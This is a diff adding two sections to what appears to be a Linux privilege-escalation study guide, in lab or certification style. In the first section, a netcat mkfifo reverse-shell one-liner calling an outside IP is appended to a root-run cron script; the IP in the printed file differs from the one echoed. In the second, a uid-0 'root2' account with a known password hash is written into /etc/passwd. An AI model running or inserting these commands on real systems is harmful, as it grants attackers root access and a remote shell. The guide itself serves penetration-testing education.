@@ -317,3 +317,62 @@ listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
 ## Insecure File Permissions
 
 ### Abusing Cron Jobs
+
+To leverage Insecure File Permissions, we need a writable file that runs with elevated privileges. The cron time-based job scheduler on Linux is a prime target. 
+
+```console
+$ ls -lah /etc/cron*
+$ crontab -l
+$ sudo crontab -l
+$ grep "CRON" /var/log/syslog
+Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+```
+
+Here, user_backups is run as root every minute. Check contents and perms.
+
+```console
+$ cat /home/joe/.scripts/user_backups.sh
+$ ls -lah /home/joe/.scripts/user_backups.sh
+```
+
+We can edit this file. Add a reverse shell one-liner.
+
+```console
+joe@debian-privesc:~$ cd .scripts
+
+joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
+
+joe@debian-privesc:~/.scripts$ cat user_backups.sh
+#!/bin/bash
+
+cp -rf /home/joe/ /var/backups/joe/
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
+```
+
+Set up a listener on Kali and wait.
+
+```console
+$ nc -lnvp 1234
+```
+
+### Abusing Password Authentication
+
+Unless a cental cred system like AD or LSAP is used, Linux passwords are usually in /etc/shadow, unreadable by normal users. Password hashes and other information, though, are world-readible in /etc/passwd. If a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow. So - if  we can write to /etc/passwd, we can set any password for any account.
+
+Assuming we already have su, let's add another superuser root2 and a password hash to /etc/passwd. 
+
+```console
+$ openssl passwd w00t
+
+$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+$ su root2
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
